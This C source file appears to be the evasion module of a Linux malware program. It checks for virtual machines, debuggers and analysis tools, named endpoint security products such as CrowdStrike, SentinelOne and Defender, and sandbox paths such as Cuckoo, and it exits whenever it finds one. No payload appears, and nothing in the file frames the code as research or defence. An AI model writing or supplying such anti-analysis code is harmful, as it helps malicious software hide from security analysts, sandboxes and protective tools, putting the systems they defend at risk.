#include "evasion.h"

#if defined(__aarch64__) || defined(__arm64__)
    #include "syscalls_arm64.h"
#elif defined(__x86_64__) || defined(__amd64__)
    #include "syscalls_x86_64.h"
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <ctype.h>
#include <sys/stat.h>
#include <dirent.h>

int evasion_checks(void) {
    if (detect_virtualization()) {
        printf("Virtualization environment detected. Exiting.\n");
        return -1;
    }
    if (detect_debugging()) {
        printf("Debugging tools detected. Exiting.\n");
        return -1;
    }
    if (check_process_list()) {
        printf("Security products detected in process list. Exiting.\n");
        return -1;
    }
    if (check_file_signatures()) {
        printf("Analysis file signatures detected. Exiting.\n");
        return -1;
    }
    return 0; // No issues detected
}

int detect_virtualization(void) {
    FILE *fp;
    char buffer[256];
    
    // Check /proc/cpuinfo for VM indicators
    fp = fopen("/proc/cpuinfo", "r");
    if (!fp) return 0;
    
    while (fgets(buffer, sizeof(buffer), fp)) {
        if (strstr(buffer, "hypervisor") || strstr(buffer, "QEMU") || 
            strstr(buffer, "VirtualBox") || strstr(buffer, "VMware")) {
            fclose(fp);
            return 1;  // VM detected
        }
    }
    fclose(fp);
    
    struct stat st;
    if (stat("/sys/class/dmi/id/product_name", &st) == 0) {
        fp = fopen("/sys/class/dmi/id/product_name", "r");
        if (fp) {
            if (fgets(buffer, sizeof(buffer), fp)) {
                if (strstr(buffer, "VirtualBox") || strstr(buffer, "VMware") ||
                    strstr(buffer, "QEMU") || strstr(buffer, "KVM")) {
                    fclose(fp);
                    return 1;
                }
            }
            fclose(fp);
        }
    }
    
    return 0;  // No VM detected
}

// Detect debugging/analysis tools
int detect_debugging(void) {
    DIR *proc_dir;
    struct dirent *entry;
    char suspicious_processes[][32] = {
        "gdb", "strace", "ltrace", "objdump", "readelf", 
        "hexdump", "strings", "wireshark", "tcpdump"
    };
    int suspicious_count = sizeof(suspicious_processes) / sizeof(suspicious_processes[0]);
    
    proc_dir = opendir("/proc");
    if (!proc_dir) return 0;
    
    while ((entry = readdir(proc_dir)) != NULL) {
        if (entry->d_type == DT_DIR && strspn(entry->d_name, "0123456789") == strlen(entry->d_name)) {
            char comm_path[PATH_MAX];
            snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", entry->d_name);
            
            FILE *comm_file = fopen(comm_path, "r");
            if (comm_file) {
                char process_name[64];
                if (fgets(process_name, sizeof(process_name), comm_file)) {
                    // Remove newline
                    process_name[strcspn(process_name, "\n")] = 0;
                    
                    for (int i = 0; i < suspicious_count; i++) {
                        if (strcmp(process_name, suspicious_processes[i]) == 0) {
                            fclose(comm_file);
                            closedir(proc_dir);
                            return 1;  // Debugging tool detected
                        }
                    }
                }
                fclose(comm_file);
            }
        }
    }
    
    closedir(proc_dir);
    return 0;  // No debugging tools detected
}

int check_process_list(void) {
    FILE *fp;
    char line[512];
    char security_products[][32] = {
        "crowdstrike", "falcon-sensor", "carbonblack", 
        "sentinelone", "cylance", "cybereason", "defender", 
        "symantec", "mcafee", "kaspersky", "avast", "bitdefender"
    };
    int product_count = sizeof(security_products) / sizeof(security_products[0]);
    
    fp = popen("ps aux", "r");
    if (!fp) return 0;
    
     while (fgets(line, sizeof(line), fp)) {
         // Convert to lowercase for comparison
         for (int i = 0; line[i]; i++) {
             line[i] = tolower(line[i]);
         }
  
         for (int i = 0; i < product_count; i++) {
             if (strstr(line, security_products[i])) {
                 pclose(fp);
                 return 1;  // Security product detected
             }
         }
     }
    
    pclose(fp);
    return 0;  
}
// Check for analysis file signatures
int check_file_signatures(void) {
    const char *analysis_files[] = {
        "/tmp/analysis.log",
        "/tmp/malware_sample",
        "/tmp/sandbox_",
        "/home/analyst/",
        "/opt/cuckoo/",
        "/var/log/sandbox"
    };
    int file_count = sizeof(analysis_files) / sizeof(analysis_files[0]);
    
    for (int i = 0; i < file_count; i++) {
        struct stat st;
        if (stat(analysis_files[i], &st) == 0) {
            return 1;  // Analysis environment detected
        }
    }
    
    return 0;  // No analysis signatures found
}
